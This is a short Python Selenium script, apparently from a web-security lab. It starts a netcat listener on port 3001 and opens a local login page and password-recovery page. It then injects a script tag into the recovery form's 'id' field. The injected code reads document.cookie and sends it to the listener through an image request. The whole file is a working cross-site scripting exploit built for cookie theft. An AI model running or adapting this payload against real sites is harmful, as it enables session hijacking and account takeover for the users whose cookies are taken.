from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.alert import Alert
import subprocess
import time

def main():
    print("START NETCAT: LISTEN PORT 3001\n")
    netcat = subprocess.Popen(['nc', '-l', '3001'])


    try:
        driver = webdriver.Chrome()

        login_page = 'http://localhost:8080/login.php'
        driver.get(login_page)
        time.sleep(1)

        recovery_page = 'http://localhost:8080/recovery.php'
        driver.get(recovery_page)
        time.sleep(1)
        
        #INJECTION
        id_field = driver.find_element(By.NAME, 'id')
        id_field.send_keys("  <script>\
                                        var cookie = document.cookie;\
                                        var img = new Image();\
                                        img.src = 'http://localhost:3001/' + cookie;\
                                        alert(document.cookie);\
                                    </script>\
                                 ")
        time.sleep(1)
        submit_button = driver.find_element(By.XPATH, "//input[@type='submit' and @class='btn btn-primary' and @value='Send my password securely']")
        submit_button.click()
        time.sleep(2)
        alert = driver.switch_to.alert
        alert.accept()
    
    except Exception as e:
        print(f"Error: {e}")
    
    finally:
        driver.quit()
        netcat.terminate()
        netcat.wait()

if __name__ == "__main__":
    main()
